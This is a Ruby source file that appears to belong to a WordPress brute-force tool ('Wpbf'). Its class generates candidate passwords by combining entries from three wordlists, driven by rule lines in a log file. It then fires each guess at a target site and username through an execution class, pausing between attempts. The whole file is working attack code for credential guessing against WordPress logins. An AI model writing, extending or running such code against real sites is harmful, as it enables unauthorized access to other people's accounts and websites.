module Wpbf

	class Three

		def initialize(target,username,delay)
			files = File.readlines("logs/wp-bruteforce/3.txt")
			fsize = 0..files.size.to_i - 1
			fsize.each_with_index do |l|

				splitData = files[l].split("|")
				a = get_dict(splitData[0].gsub("\n",""))
				b = get_dict(splitData[1].gsub("\n",""))
				c = get_dict(splitData[2].gsub("\n",""))

				x_Array 	= 0..a.size.to_i - 1
				y_Array 	= 0..b.size.to_i - 1
				z_Array 	= 0..c.size.to_i - 1

				x_Array.each_with_index do |x|
					y_Array.each_with_index do |y|
						z_Array.each_with_index do |z|
							pwd = "#{a[x]}#{b[y]}#{c[z]}".gsub("\n","")
							Wpbf::Execution.new(target,username,pwd)
							sleep(delay)
						end
					end
				end
			end
		end

		def get_dict(x)
			if x.to_i == 1
				return File.readlines('wordlists/hk.txt')
			elsif x.to_i == 2
				return File.readlines('wordlists/hb.txt')
			elsif x.to_i == 3
				return File.readlines('wordlists/ak.txt')
			elsif x.to_i == 4
				return File.readlines('wordlists/sym.txt')
			else
				return false
			end
		end

	end # End Class

end # End Module